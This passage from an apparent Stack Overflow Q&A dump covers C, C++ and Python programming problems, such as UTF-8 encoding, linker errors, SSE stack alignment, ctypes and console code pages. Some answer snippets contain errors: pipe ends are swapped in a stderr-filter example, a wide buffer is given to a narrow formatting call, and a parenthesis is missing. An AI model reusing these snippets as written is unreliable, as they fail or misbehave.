<p>That gives a file of 5 bytes (the é takes up two bytes but how does Python knows that it must read 2 bytes there?)</p>

<pre><code>f = open('test.txt', 'w')
f.write('abcそ')  # a Japanese character
f.close()
</code></pre>

<p>That gives a file of 6 bytes (the そ takes up three bytes but how does Python knows that it must read 3 bytes there?)</p>

<p>So I can understand that Unicode takes two bytes, but it is sometimes 1, or 2 or 3 bytes, I fail to see how it works.</p>
","9530","","<p>By default, it writes the output file with an encoding of <a href=""http://en.wikipedia.org/wiki/UTF-8"" rel=""nofollow"">UTF-8</a>, which is a variable-length encoding: it encodes ASCII characters (code points U+0000-U+007F) using 1 byte, code points U+0080-U+07FF (which includes Latin-1 characters such as é) using 2 bytes, code points U+0800-U+FFFF (which includes Chinese and Japanese characters such as そ) using 3 bytes, and code points U+10000-U+10FFFF using 4 bytes.</p>

<p>If you want to use a different encoding, such as UTF-16, you can use <a href=""http://docs.python.org/library/stdtypes.html#str.encode"" rel=""nofollow""><code>str.encode</code></a> to use your desired encoding:</p>

<pre><code># Save the string as UTF-16 little-endian
f = open('test.txt', 'w')
f.write(u'abcそ'.encode('utf-16le')  # Output will be 8 bytes
f.close()
</code></pre>
"
"<p>I have written the following code, and I don't understand why read is not storing the characters the way I expect:</p>

<pre><code>char temp;
char buf[256];

    while(something)   
        read (in,&amp;temp, 1);
        buf[strlen(buf)] = temp;
     }
</code></pre>

<p>If I print <code>temp</code> and the last place of the <code>buf</code> array as I am reading, sometimes they don't match up. For example maybe the character is 'd' but the array contains <code>%</code> or the character is <code>0</code> and the array contains <code>.</code></p>

<p>I am reading less than 256 characters but it doesn't matter because I am printing as I am reading.</p>

<p>Am I missing something obvious?</p>
","9530","","<p>Yes, you're not initializing <code>buf</code> -- <code>strlen(buf)</code> is undefined.  You should initialize it like so:</p>

<pre><code>buf[0] = 0;
</code></pre>

<p>Also, it's better to keep track of the length instead of calling <code>strlen</code> each iteration to avoid a <a href=""http://www.joelonsoftware.com/articles/fog0000000319.html"" rel=""nofollow"">Shlemiel the painter algorithm</a>.</p>

<p>You should also be checking for errors in the call to <code>read(2)</code> -- if it returns -1 or 0, you should break out of your loop, since it means either an error occurred or you reached the end of the file/input stream.</p>
"
"<p>I have these 2 c file and a header file. All these files are built by a <code>Makefile</code>. </p>

<p><strong>mysql_storage.h</strong></p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;mysql.h&gt;
#include &lt;glib/gstdio.h&gt;

#if 1
typedef enum {
        STORAGE_OK = 0,
        STORAGE_NO_SUCH_USER,
        STORAGE_INVALID_PASSWORD,
        STORAGE_ALREADY_EXISTS,
        STORAGE_OTHER_ERROR/* Error that isn't caused by user input, such as 
                               a database that is unreachable. log() will be 
                               used for the exact error message */
} storage_status_t;

typedef enum
{
    MYSQL_PASS_CHECK_ONLY = -1,
    MYSQL_PASS_UNKNOWN = 0,
    MYSQL_PASS_WRONG,
    MYSQL_PASS_OK
} mysql_pass_st;
#endif

static void mysql_storage_init( void );
static void mysql_storage_deinit( void );
static storage_status_t mysql_storage_load(const char *password );
static storage_status_t mysql_storage_check_pass( const char *nick, const char *password );
static storage_status_t mysql_storage_save( int overwrite );
static storage_status_t mysql_storage_remove( const char *nick, const char *password );
</code></pre>

<p><strong>mysql_storage.c</strong></p>

<pre><code>#include ""mysql_storage.h""

MYSQL *mysql;

static void mysql_storage_init( void ) {
    if (mysql_init(mysql) == NULL)
        fprintf( stderr, ""Can not initialize MySQL. Configuration won't be saved."");

    if (!mysql_real_connect(mysql, ""localhost"", ""USERNAME"", ""PASSWORD"", NULL, 3306, NULL, 0))
        fprintf( stderr, ""%s\nConfiguration won't be saved."", mysql_error(mysql));

    if (mysql_select_db(mysql, ""DATABASENAME""))
        fprintf( stderr, ""%s\nConfiguration won't be saved."", mysql_error(mysql));
}
static void mysql_storage_deinit( void ) {
    if(mysql!=NULL) 
        mysql_close(mysql);
}
static storage_status_t mysql_storage_check_pass( const char *nick, const char *password ){    return STORAGE_OTHER_ERROR;}
static storage_status_t mysql_storage_load(const char *password ){    return STORAGE_OTHER_ERROR;}
static storage_status_t mysql_storage_save( int overwrite ){    return STORAGE_OTHER_ERROR;}
static storage_status_t mysql_storage_remove( const char *nick, const char *password ){    return STORAGE_OTHER_ERROR;}
</code></pre>

<p><strong>main.c</strong></p>

<pre><code>#include&lt;stdio.h&gt;
#include ""mysql_storage.h""

    int main(){
        // connect mysql
        mysql_storage_init();
        // check a password
        printf(""check password: %d\n:"", mysql_storage_check_pass(""hello"", ""world""));
        // close mysql
        mysql_storage_deinit();
    }
</code></pre>

<p>Lastly the <strong>Makefile</strong></p>

<pre><code>CFLAGS=-I/usr/include/mysql -DBIG_JOINS=1 -fno-strict-aliasing -g -I/usr/include/glib-2.0 -I/usr/lib/x86_64-linux-gnu/glib-2.0/include -I.
LIBS=-L/usr/lib/x86_64-linux-gnu -lmysqlclient -lpthread -lz -lm -lrt -ldl -lglib-2.0 -L.
CC=gcc

all: main
clean:
        rm main  *.o
main: mysql_storage.o main.o 
        $(CC)  main.o mysql_storage.o $(LIBS) -o main
.c.o:
        $(CC) -c $(CFLAGS) $&lt;
</code></pre>

<p>When I make, I get this error.</p>

<pre><code>gcc  main.o mysql_storage.o -L/usr/lib/x86_64-linux-gnu -lmysqlclient -lpthread -lz -lm -lrt -ldl -lglib-2.0 -L. -o main
main.o: In function `main':
/home/shiplu/projects/mysql_interface/main.c:8: undefined reference to `mysql_storage_init'
/home/shiplu/projects/mysql_interface/main.c:11: undefined reference to `mysql_storage_check_pass'
/home/shiplu/projects/mysql_interface/main.c:15: undefined reference to `mysql_storage_deinit'
collect2: ld returned 1 exit status
</code></pre>

<p>As you can see I am linking <code>main.o</code> and <code>mysql_storage.o</code>. So it should not throw undefined reference error. What is the problem here?</p>
","9530","","<p>You declared your functions <code>mysql_storage_init</code> as <code>static</code>, meaning they have <strong>internal <a href=""http://en.wikipedia.org/wiki/Linkage_%28software%29"" rel=""nofollow"">linkage</a></strong> -- this means they are not visible to other translation units.</p>

<p>Since you need to call them from other object files, you should instead declare them to have <strong>external linkage</strong> by omitting the <code>static</code> keyword in their declarations and definitions.  The prototypes in the header file may optionally declare them <code>extern</code>, but that is not required, since the linkage is external by default.</p>
"
"<p>I have a Windows 8 metro app written in c++ that I'm trying to compile to ARM. During linking, I get many instances of the following error:</p>

<pre><code>""error LNK2013: BLX23(T) fixup overflow.  Target '&lt;mangledName&gt;' is out of range""
</code></pre>

<p>The <a href=""http://msdn.microsoft.com/en-us/library/bc3e8d1t%28v=vs.110%29.aspx"" rel=""nofollow"" title=""MSDN site"">MSDN site</a> says:
""You can resolve this problem by creating multiple images or by using the /ORDER option so the instruction and target are closer together.""</p>

<p>But I don't really get it how to make that work. The symbols in question are compiler-generated and there is no Itanium Architecture involved, so the other suggestions on that page don't apply. Also, the files with errors are *.g.cpp files, generated by the compiler from xaml pages included in the project.</p>

<p>The metro application runs just fine on Win32 configuration, so I wonder if someone with more experience on ARM could have a better idea of how to solve this sort of issue.</p>

<p>The setup is Visual Studio 2012 RC on Windows 8 RP x64.</p>
","9530","","<p>The key problem is that the ARM instruction set only supports <em>relative</em> displacements for the instructions that the compiler is trying to use to generate the function call, and that those displacements have a limited number of bits in them.  In your case, you have so much code that the called function and the call site are so far apart in address space that there aren't enough bits in the displacement for the compiler to generate a correct call instruction.</p>

<p>This can happen on ARM and IA64 (Itanium), but it cannot happen in x86 and x86-64 since those instruction sets have jump/call instructions which can branch to any possible address in the process' address space.</p>

<p>The only fix to this is to move the caller and the callee closer together in the final executable image.  One way of doing this is to just move the code around in your source files, since usually the compiler and linker place function code into the executable in the same order in which the functions are declared in source (within one translation unit).  Optimizations often alter that order, but for the most part it's approximately true.</p>

<p>Another option, as mentioned in the link you provided, is to use the linker's <code>/ORDER</code> command line option to move functions around manually.  Create an order file, and put together functions which are exhibiting this problem, assuming there's not too many of them.  Since it sounds like you're dealing with autogenerated code, this is probably the best option, because you don't want to have to edit the code each time it's regenerated.</p>

<p>You may also want to post a bug report to <a href=""http://connect.microsoft.com/"" rel=""nofollow"">connect.microsoft.com</a>, since the default toolset really ought not to force you to deal with this rather strange error (which is a very real error due to the limitations the ARM instruction set -- it's not the compiler's fault).</p>
"
"<p>to be short and sweet, this is happening right now and has never happened to me before today:  </p>

<pre><code>  g++ assn1m.c segment.cpp
/tmp/cc2yUKRO.o: In function `bit_to_ascii(char const*, char*)':
segment.cpp:(.text+0x0): multiple definition of `bit_to_ascii(char const*, char*)'
/tmp/cc2Xgj7t.o:assn1m.c:(.text+0x0): first defined here
/usr/lib/gcc/i586-suse-linux/4.4/../../../crt1.o: In function `_start':
/usr/src/packages/BUILD/glibc-2.10.1/csu/../sysdeps/i386/elf/start.S:115: undefined reference to `main'
collect2: ld returned 1 exit status
</code></pre>
","9530","","<p>You have two definitions of the function <code>bit_to_ascii(char const*, char*)</code>, one of which is in assn1m.c and the other of which is in segment.cpp.  This is often caused by defining it in a header file without <code>inline</code> and including it in multiple source files.</p>

<p>Note that in C99, the <code>inline</code> specifier works slightly differently than in C++.  You may have to define it as <code>extern inline</code> to get it to work properly.</p>

<p>You also didn't define the <code>main</code> function anywhere for your program's entry point, or you're not linking in the object file where it's defined, though that's a separate issue from the multiple definitions error.</p>
"
"<p>I have been working on this for a few hours now, and I keep getting a whole page of linker errors. All have to do with SSL in some form or fashion. </p>

<p>g++  -DCURL_STATICLIB -L ..\lib -o testing testing.cpp -lcurl</p>

<p>Im sure I am missing some parameters on this command, any ideas what they might be, or where I might find a list?</p>
","9530","","<p>If you don't want SSL support, edit the configuration and undefine the preprocessor macros <code>USE_SSLEAY</code> and <code>SSL_OPENSSL</code>, and the linker errors will go away.</p>

<p>If you <em>do</em> want SSL support, you need to compile and link it in yourself, since it doesn't ship with libcurl.  See <a href=""http://stackoverflow.com/questions/197444/building-libcurl-with-ssl-support-on-windows"">this question</a> for detail instructions on how to do that on Windows (which I assume you're using, since you mentioned MinGW).</p>

<p>Some other operating systems, such as Linux and Mac OS X, ship with OpenSSL, so you don't need to jump through any hoops—you can just add one of <code>-lssl</code>, <code>-lopenssl</code>, or <code>-lcrypto</code> to your command line, and it should just work (the exact library name varies with OSes).</p>
"
"<p>I currently have a case statement in bash that looks like so:</p>

<pre><code>restart)
    if kill -0 PID; then
        while kill -0 PID; do
            //exit script
        done
        screen -dmS screen1^M
        screen -S screen1 -p 0 -X stuff '//code here'^M
    else
        //other stuff
    fi
    ;;
</code></pre>

<p>When I use this script, the screen meant to be started as <code>screen1</code> starts as <code>screen1?</code> instead. What is the cause of this, and how would I fix it?</p>
","9530","","<p>You have extra <a href=""http://en.wikipedia.org/wiki/Carriage_return"" rel=""nofollow"">carriage returns</a> (those funny <code>^M</code>s) at the ends of some of your lines.  Windows uses a carriage return followed by a linefeed (CRLF) as its line endings, but Linux uses just a plain linefeed, so any extraneous carriage returns are sometimes interpreted as regular characters, particularly in your case.</p>

<p>To fix this, either delete the carriage returns from your script manually, or use a program such as <a href=""http://linux.die.net/man/1/dos2unix"" rel=""nofollow""><code>dos2unix(1)</code></a> to convert the line endings (many other programs can also do this).</p>
"
"<p>I'd really like your help with the following problem.</p>

<p>I need to read <strong>N</strong> integers (in binary format) from two <strong>two binary files</strong>, and to write to another output file all the common integers(again in a binary format) in <strong>O(nlogn)</strong> time.</p>

<p>Here's a sketch of what I want to do:</p>

<p>1-I know that I can't use <code>fscanf</code> with <code>%d</code>, since these are not text files, but since I know that there are N numbers in each file, I want to run in a 'for' loop N times and</p>

<pre><code>for (i=0; i&lt;N; i++) {
    fread(&amp;int1, 4, 1, file1);
    fread(&amp;int2, 4, 1, file2);
    arr1[i]=int1;
    arr2[i]=int2;
} 
</code></pre>

<p>Where <code>arr1</code>, <code>arr2</code> are int arrays of N size each, Is this correct? If I know that there are N integers where every integer represented by 4 bits, I would finish at the end of the file, Am I?</p>

<p>2- I want to use <code>qsort</code> for sorting each array with <code>nlogn</code> steps, but then how should I compare between the two with still nlogn steps? I didn't get to any smart way.</p>
","9530","","<p>Your code is mostly correct, except it will not behave correctly when it reaches end-of-file.  <code>fread</code> does not detect EOF until you try to read past the end, so you should test the return value in case it reaches EOF or an error occurs, e.g.:</p>

<pre><code>if(fread(..., file1) &lt; 1 ||
   fread(..., file2) &lt; 1)
{
    // Error or EOF occurred
    break;
}
</code></pre>

<p>You could also just slurp the entire arrays in a single <code>fread</code> call instead of looping, since the data is binary:</p>

<pre><code>int arr1[20], arr2[20];
if(fread(arr1, sizeof(arr1[0]), 20, file1) &lt; 20 ||
   fread(arr2, sizeof(arr2[0]), 20, file2) &lt; 20)
{
    // Error or early EOF occurred
}
</code></pre>

<p>For your second question, just place all of the integers into a single flat array.  You can either do this by reading them directly into a single array, or copy them into one array after you've read in all of the data.  Then <code>qsort</code> the combined array.</p>
"
"<p>As the title states i need to watch a directory for changes(mainly for file additions) using python</p>

<p>I stumble upon a few solutions <a href=""http://stackoverflow.com/questions/182197/how-do-i-watch-a-file-for-changes-using-python"">here</a> but none of them work properly</p>

<p>1.One solution was using ""fcntl"", I tried it on my system but it failed with an error ""no attribute F_SETSIG"".Googling it resulted in nothing useful</p>

<p>2.Python module Watchdog fails to install as i don't have xcode, which i don't want to download(too big to download and lots of unnecessary things for such small work)</p>

<p>The accepted solution was windows specific and none of others work on osx without big packages </p>

<p>So in the end I don't want any solutions involving XCODE, PyQT, polling, busy loop(i.e. checking DIR every few seconds)</p>

<p>Applescripts support this by default, so I think python should too without any big modules/packages</p>

<p>I am using OS X 10.7.2 and python 2.7.3 by the way</p>

<p>Thanks in advance </p>
","9530","","<p>The API you want to be using is the <a href=""https://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/FSEvents_ProgGuide/Introduction/Introduction.html"" rel=""nofollow"">FSEvents</a> API.  Python doesn't ship with bindings to that API, so you'll need to either make your own bindings or use a library such as <a href=""http://pypi.python.org/pypi/MacFSEvents/0.2.1"" rel=""nofollow"">MacFSEvents</a> or <a href=""http://code.google.com/p/python-watchdog/"" rel=""nofollow"">python-watchdog</a>.  However you really should just install Xcode -- these libraries require compiling the C bindings, and Xcode is the easiest way to get a C compiler.</p>

<p>If you really want to avoid Xcode, you could roll your own bindings using the <a href=""http://docs.python.org/library/ctypes.html"" rel=""nofollow"">ctypes module</a>, but that's going to be a big pain in the neck.</p>

<blockquote>
  <p>Applescripts support this by default, so I think python should too without any big modules/packages</p>
</blockquote>

<p>Tough luck.  The various 3rd-party libraries which are available are not that big, they just need a C compiler to work.</p>
"
"<p>In python 2.7.2, i need to make a copy of a file in Linux. </p>

<p>newfile = ""namePart1"" + dictionary[key] + ""namePart2""</p>

<p>os.system(""cp cfn5e10_1.lp newfile"")</p>

<p>But, the newfile cannot be replaced by its correct string. </p>

<p>the posts in the forum cannot help.</p>

<p>Any help is really appreciated. </p>
","9530","","<p>Use <a href=""http://docs.python.org/library/shutil.html#shutil.copyfile""><code>shutil.copyfile</code></a> to copy a file instead of <code>os.sytem</code>, it doesn't need to create a new process and it will automatically handle filenames with unusual characters in them, e.g. spaces -- <code>os.system</code> just passes the command to the shell, and the shell might break up filenames that have spaces in them, among other possible issues.</p>

<p>For example:</p>

<pre><code>newfile = ""namePart1"" + dictionary[key] + ""namePart2""
shutil.copyfile(""cfn5e10_1.lp"", newfile)
</code></pre>
"
"<p>I'm getting a segfault on line 15 of my .cpp file. I'm not sure why. Various code snippets:
explosionhandler.h:</p>

<pre><code>    class explosionhandler {
        public:
    struct explosion {
    ...
    };
    vector&lt;struct explosion&gt; explosions;
    struct explosion_type {
    ...
    };
    vector&lt;struct explosion_type&gt; type;
    int num_types;

    explosionhandler();
    ~explosionhandler();
    void registerexplosion(int&amp; ttype,ALLEGRO_BITMAP*&amp; b,int seq, float a, float m,float e);

    void createexplosion(int ttype,float x,float y);
    void drawexplosions(ALLEGRO_BITMAP* screen);

    void gettype(explosion_type&amp; a,ALLEGRO_BITMAP*&amp; b,int&amp; nseq, float&amp; aa, float&amp; ee, float&amp; mm);


        };#endif 
</code></pre>

<p>explosionhandler.cpp:</p>

<pre><code>    explosionhandler::explosionhandler()
    {
        num_types=0;
    }
    void explosionhandler::registerexplosion(int&amp; ttype,ALLEGRO_BITMAP*&amp; b,int seq, float a, float m,float e)
    {
        explosion_type n;
        ....
        ttype = num_types;     /*********** right here *******************/
        num_types++;
        type.push_back(n);
    }
</code></pre>

<p>explosionhandler passed as pointer to object rocket:</p>

<p>rocket.h:</p>

<pre><code>...
class explosionhandler;
class rocket {
public:
        ...
        void setrocket(ALLEGRO_BITMAP*&amp; a,ALLEGRO_BITMAP*&amp; b, explosionhandler*&amp; h);
        ...
        int exptype;
        ...
}; #endif
</code></pre>

<p>rocket.cpp:</p>

<pre><code>rocket::rocket()
{
        ...
        exptype=-1;
}
void rocket::setrocket(ALLEGRO_BITMAP*&amp; a,ALLEGRO_BITMAP*&amp; b, explosionhandler*&amp; h)
{
    handler = h;
    area.sethitboundaries(a);
    fprintf(stdout,""setrocket, # of rockets in vector: %i\n"",(int)rockets.size());
h-&gt;registerexplosion(exptype,b,3,(float)al_get_bitmap_width(b),(float)0,(float)-18); //called function
}
</code></pre>

<p>and finally main.cpp (abbreviated):</p>

<pre><code>#include ""rocket.h""
#include ""explosionhandler.h""
#include &lt;allegro5/allegro.h&gt;
#include &lt;allegro5/allegro_image.h&gt;
#include &lt;stdio.h&gt;
#include &lt;cstdlib&gt;
#define PI 3.14159265
...
rocket rock(bullet_speed+2,width,height);
explosionhandler *handler;
...
int setup()
{
        ...
        rock.setrocket(rk,exp,handler);
        rock.setlimit(5);
        al_set_target_bitmap(al_get_backbuffer(display));
        ...
}
...
</code></pre>

<p>Ok Yeah its clear now the problem was handler was not initialized. whoops. </p>

<p>and of course explosionhandler is a pointer in main.cpp, rocket is an object declared in main.cpp, both are globals.</p>

<p>Bless my little noob heart I know not what I do.</p>
","9530","","<p>My psychic sense tells me that you're calling <code>rocket::setrocket</code> with a NULL pointer as the parameter <code>h</code> (or more specifically, a reference to a NULL pointer), and then you're calling <code>h-&gt;registerexplosion()</code> on the NULL pointer.</p>

<p>Don't do that.  Pass in a valid pointer instead, or allocate a new object (making sure you delete it properly later).</p>
"
"<p>I've got a bunch of unit tests which use an invalid cert to provoke an error condition, this works perfectly but unfortunately my neat terminal output is now saturated with ugly OpenSSL errors, does anyone know how I can suppress these errors?</p>

<p>EDIT1: There errors look like this:</p>

<p>140376922039968:error:0906D06C:lib(9):func(109):reason(108):pem_lib.c:696:Expecting: CERTIFICATE
140376922039968:error:0D0680A8:lib(13):func(104):reason(168):tasn_dec.c:1319:
140376922039968:error:0D07803A:lib(13):func(120):reason(58):tasn_dec.c:381:Type=X509
140376922039968:error:0906700D:lib(9):func(103):reason(13):pem_oth.c:83:
140376922039968:error:0D0680A8:lib(13):func(104):reason(168):tasn_dec.c:1319:
140376922039968:error:0D07803A:lib(13):func(120):reason(58):tasn_dec.c:381:Type=X509
140376922039968:error:0906700D:lib(9):func(103):reason(13):pem_oth.c:83:</p>

<p>These are generated when I pass in an invalid X.509 cert to the OpenSSL X509 PEM decode function. The code that generates these errors follows:</p>

<pre><code>    BIO *certBio = BIO_new_mem_buf(certData, certSize);
    X509 *x509 = PEM_read_bio_X509(certBio, NULL, NULL, NULL);
</code></pre>

<p>EDIT2: Sorry, my bad, I was calling the print errors function in my code, my apologies to those who spared some time to look into this :(</p>
","9530","","<p>One thing that might work would be to switch over stderr to be a pipe and have another thread/process read from that pipe and filter out the messages you don't want.  Something like this might work:</p>

<pre><code>// Error checking omitted for expository purposes
int origStderr;
int stderrFilter[2];

void RunTests()
{
    // Save original stderr
    origStderr = dup(STDERR_FILENO);

    // Create pipe to be used for filtering out OpenSSL messages
    pipe(stderrFilter);

    // Move the writing end of the pipe onto stderr
    dup2(pipe[0], STDERR_FILENO);
    close(pipe[0]);

    // Create thread to read from the pipe
    pid_t filterThread;
    pthread_create(&amp;filterThread, NULL, &amp;StderrFilterThreadProc, NULL);

    // Ok, run the actual unit tests
    RunOpenSSLUnitTests();

    // Close down the pipe, join the thread, and restore stderr
    dup2(origStderr, STDERR_FILENO);
    close(origStderr);
    pthread_join(filterThread, NULL);
    close(stderrFilter[1]);
}

void *StderrFilterThreadProc(void *arg)
{
    char buffer[SOME_REASONABLY_LARGE_BUFFER_SIZE];
    int n;

    while((n = read(stderrFilter[1], buffer, sizeof(buffer)) &gt; 0)
    {
        // Parse buffer into lines, determine if each line was an OpenSSL message
        for(each line in buffer)
        {
            if(line came did not come from OpenSSL)
                write(origStderr, line, line_length);
        }
    }

    return 0;
}
</code></pre>
"
"<p>I have a c function as:</p>

<pre><code>extern ""C""  __declspec(dllexport) MyStruct foo()
{
    MyStruct s = {0, 0}
    return s;
}
</code></pre>

<p>where the MyStruct is define as:</p>

<pre><code>struct MyStruct{
    uInt32   a;
    uInt32   b;
    void *   c;
};
</code></pre>

<p>And i am trying to call the function in python, but always get error like:</p>

<blockquote>
  <p>WindowsError: exception: access violation writing 0x00000000</p>
</blockquote>

<p>if i remove void * c from the struct, then it works...</p>

<p>so how should i return the void pointer?
thanks!</p>
","9530","","<p>This is almost certainly being caused by a disagreement between your C compiler and the ctypes library on the ABI for returning the object.  Without seeing your Python code, it's hard to say whether the problem is due to an incorrect Python declaration of the return type, a bug in the ctypes library, or a non-standard ABI chosen by the C compiler.</p>

<p>For the most portable behavior, I'd suggest changing the function to return the object via an out parameter, like so:</p>

<pre><code>extern ""C""  __declspec(dllexport) void foo(MyStruct *ret)
{
    MyStruct s = {0, 0}
    *ret = s;
}
</code></pre>

<p>And interface with it like so:</p>

<pre><code>class MyStruct(ctypes.Structure):
    _fields_ = [(""a"", ctypes.c_uint),
                (""b"", ctypes.c_uint),
                (""c"", ctypes.c_void_p)]

mylib = ctypes.cdll.LoadLibrary('mylibrary')
foo = mylib.foo
foo.argtypes = [ctypes.POINTER(MyStruct)]

x = MyStruct()
foo(ctypes.byref(x))
# x should now have the return value from the C code
</code></pre>
"
"<p>I'm using a file system library and I'm trying to create a readline function.</p>

<pre><code>int al_fgetc(ALLEGRO_FILE *f)
</code></pre>

<blockquote>
  <p>Introduced in 5.0.0</p>
  
  <p>Read and return next byte in the given file. Returns EOF on end of file or if an error occurred.</p>
</blockquote>

<p>That is the function I'm using from the library. What I want to do is += the resulting char into a std string if it is  != EOF which is -1. I'm just not sure if I need to cast it to get the correct result. Will something like this do it:</p>

<pre><code>bool File::readLine( std::string&amp; buff )
{
    if(eof() || !isOpen())
    {
        return false;
    }
    buff = """";
    int c = 0;
    while(c = al_fgetc(m_file) != EOF &amp;&amp; c != '\n')
    {
        buff += (char)c;
    }
    return buff.length() &gt; 0;
}
</code></pre>

<p>I'm going to be reading utf-8 from file so I need to make sure this works correctly.</p>

<p>Thanks</p>
","9530","","<p>Yes, this will work, except you need an extra set of parentheses because the <code>!=</code> operator has higher precedence than the <code>=</code> operator:</p>

<pre><code>while((c = al_fgetc(m_file)) != EOF &amp;&amp; c != '\n')
    ...
</code></pre>

<p>The only reason that <code>fgetc</code> returns <code>int</code> instead of <code>char</code> is that there are 257 possible return values: all 256 possible bytes, or <code>EOF</code>, which signals that there's no more data left in the file.  It will always return either 0-255 or <code>EOF</code>, so it's safe to cast the return value to <code>char</code> or <code>unsigned char</code> once you've tested it for <code>EOF</code>.</p>
"
"<p>The following compiles without errors or warnings but doesn't snag the IEFrame window, or at least I know it fails to change that window's print orientation to landscape:</p>

<pre><code>PRINTDLGEX pd;
pd.lStructSize = (DWORD)sizeof(PRINTDLG);    
BOOL GetPrinterDeviceDefaults(struct tagPDA* pd);

BOOL bRet=AfxGetApp()-&gt;GetPrinterDeviceDefaults(&amp;pd); 
pd.hwndOwner = FindWindow(""IEFrame"", NULL);
LPDEVMODE pDevMode = (LPDEVMODE)::GlobalLock(&amp;pd.hDevMode);
pDevMode-&gt;dmOrientation = DMORIENT_LANDSCAPE;
::GlobalUnlock(&amp;pd.hDevMode);
</code></pre>

<p>I have evidence the code may have acquired the hWnd of the IEFrame window because the results of <code>MessageBox(0,(LPCSTR)pd.hwndOwner,""[header]"",MB_OK);</code> displays some text gobbledygook in the msg. instead of nothing.</p>

<p>Thanks for any help.</p>
","9530","","<p>I'm not at all familiar with the PRINTDLG API you're trying to use, but your MessageBox code is all wrong.</p>

<p>The <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms645505%28v=vs.85%29.aspx"" rel=""nofollow""><code>MessageBox</code> function</a> takes two pointers to null-terminated C strings (either ANSI strings or Unicode strings, depending on whether <code>UNICODE</code> is defined by the preprocessor).  You're passing in a window handle instead, which is not a null-terminated C string of any type -- it's just an opaque data value that only has meaning to the kernel.  So when <code>MessageBox</code> tries to interpret the string, it gets a pointer to who-knows-where, and it will either crash with an access violation or read random gobbledygook out of memory until it runs into a stray NUL byte.</p>

<p>Ordinarily the compiler will give you an error here, but by inserting the cast you're telling ""it's OK, I know what I'm doing, I promise this is really an <code>LPCTSTR</code>"", which masks the error.</p>

<p>The correct fix to this is to print the handle value into a character array.  For example:</p>

<pre><code>#define DIM(x) (sizeof(x)/sizeof((x)[0]))
wchar_t handleStr[64];
_snprintf_s(handleStr, DIM(handleStr), _TRUNCATE, ""Handle value: %p"", (void*)pd.hwndOwner);
MessageBoxW(NULL, handleStr, L""[header]"", MB_OK);
</code></pre>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/2386408/qt-gcc-sse-and-stack-alignment"">Qt, GCC, SSE and stack alignment</a>  </p>
</blockquote>



<p>I am converting a simulator from TinyPTC to WxWidgets. Some graphics routines are optimized with SSE intrinsics. During the initialization of the GUI, the initial state is rendered once, and all of the SSE routines work perfectly. However, if I call them later from an event handler, I get a SIGSEGV.</p>

<p>At first I thought those were some weird alignment issues, but it even happens for:</p>

<pre><code>__m128i zero = _mm_setzero_si128();
</code></pre>

<p>When I replace the SSE routines with non-optimized code, everything works fine.</p>

<p>I suppose the event handling happens in a different thread than the initialization. Is there anything to watch out for when using SSE from different threads? What else could possibly cause this behavior?</p>

<hr>

<p>The SIGSEGV happens at a <code>movdqa %xmm0, -40(%ebp)</code> instruction (there are several of those). If I compile with <code>-O1</code>, the <code>movdqa</code> instructions are completely optimized away, and the program runs fine. It seems to be an alignment issue with the stack after all, as already pointed out in the comments.</p>

<p>Here is the command CodeLite generates for compilation:</p>

<pre><code>g++ -c ""x:/some/folder/sse.cpp"" -g -O1 -Wall -std=gnu++0x -msse3
-mthreads -DHAVE_W32API_H -D__WXMSW__ -D__WXDEBUG__ -D_UNICODE
-ID:\CodeLite\wxWidgets\lib\gcc_dll\mswud -ID:\CodeLite\wxWidgets\include
-DWXUSINGDLL -Wno-ctor-dtor-privacy -pipe -fmessage-length=0 -o ./Debug/sse.o -I.
</code></pre>

<p>Anything unusual? Is it possible that WxWidgets changes the alignment settings somewhere?</p>
","9530","","<p>Your stack pointer is probably misaligned.  The SSE instructions require that all memory locations are 16-byte aligned.  The issue isn't occurring with the <code>_mm_setzero_si128</code> instruction, which just loads a constant into an SSE register, but rather the instruction that the compiler generated to store that register back into memory on the stack.</p>

<p>First make sure you're not using an outdated version of GCC (older versions had issues with stack alignment with SSE).  Then, try also adding the <a href=""http://gcc.gnu.org/onlinedocs/gcc/i386-and-x86_002d64-Options.html"" rel=""nofollow""><code>-mstackrealign</code></a> option for that translation unit, which will forcibly realign the stack to 16-byte alignment on function entry (which adds a very tiny runtime cost).</p>

<p>See Volume 2B page 4-67 of the <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html/"" rel=""nofollow"">Intel Architectures Software Developer Manuals</a> for more details on the <code>movdqa</code> instruction and the exact conditions under which it can generate exceptions.</p>
"
"<p>I'm having a problem with <code>cin.get()</code>:</p>

<p>While getting a char, I am converting it to int, but when I enter it through console, the result is different than when its already set in code.</p>

<p>Here is example:</p>

<pre><code>int ord(unsigned char chr){
    int ret=int(chr);
    return ret;
}
int main(){
    unsigned char chr='ň'; //This is my constant character 'ň' for now
    cout&lt;&lt;ord(chr)&lt;&lt;endl; //outputs : 242 ,which is alright for me, because it is same as in PHP and that I need
    chr=cin.get(); //now I change my constant character 'ň' to 'ň' written through console 
    cout&lt;&lt;ord(chr)&lt;&lt;endl; //outpus : 229 ,which is wrong for me, because its not same as in PHP 
}
</code></pre>

<p>How can I fix this?</p>

<p>I want to get 242, not 229, it must be same as ord()'s result in PHP.</p>
","9530","","<p>The problem is that your console is reading characters in from <a href=""http://en.wikipedia.org/wiki/Code_page_852"" rel=""nofollow"">code page 852</a>, where <code>ň</code> is encoded at code point 229 (0xE5), but you want its value in <a href=""http://en.wikipedia.org/wiki/ISO_8859-2"" rel=""nofollow"">ISO 8859-2</a> (aka Latin-2), where <code>ň</code> is encoded at code point 242 (0xF2).</p>

<p>I'd strongly suggest that you abandon this approach and work with Unicode exclusively, which doesn't have these types of issues.  Dealing with non-Unicode encodings such as the ISO 8859 variants and the DOS code pages is just asking for a world of headaches.</p>

<p>To use Unicode data, <a href=""http://stackoverflow.com/questions/3207704/how-can-i-cin-and-cout-some-unicode-text"">see this question</a>.  In Unicode, <code>ň</code> is code point U+0148.</p>

<p>Also, this is not relevant to your problem, but your <code>ord()</code> function is useless.  <code>cin.get()</code> already returns an <code>int</code>, and <code>unsigned char</code> can be implicitly cast to an <code>int</code>.</p>
"
"<p>My record.h file </p>

<pre><code>#ifndef _RECORD_H
#define _RECORD_H

void run_status_window(Recording *recording);
void stop_rec_button_clicked_cb(GtkButton *button, gpointer data);
GtkWidget* status_window(Recording *recording); 

#endif
</code></pre>

<p>My .c file</p>

<pre><code>#include ""config.h
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
